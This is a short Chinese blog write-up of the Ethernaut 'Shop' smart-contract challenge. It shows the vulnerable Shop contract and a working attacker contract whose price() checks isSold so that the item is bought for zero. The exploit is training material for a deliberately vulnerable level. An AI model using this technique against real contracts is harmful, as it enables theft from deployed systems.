---
title: Ethernaut - Shop
categories: [Ethernaut]
tags: [以太坊, 智能合约, Ethernaut]
date: 2024-12-24
---

花更少的前买东西。

<!--more-->

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

这跟上次一样啊？第一次调用返回1000，第二次调用返回100；





噢，等等，这次设置了 price 是 view 函数，不能修改状态。

但是也有办法，我们可以看gas来判断是第一次还是第二次。



又想复杂了，shop的isSold是public 的……

```solidity
pragma solidity ^0.8.0;


interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract Buyer {
    address levelInstance;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    function price() public view returns (uint256) {
        return IShop(msg.sender).isSold() ? 0 : 100;
    }

    function buy() public {
        IShop(levelInstance).buy();
    }
}
```

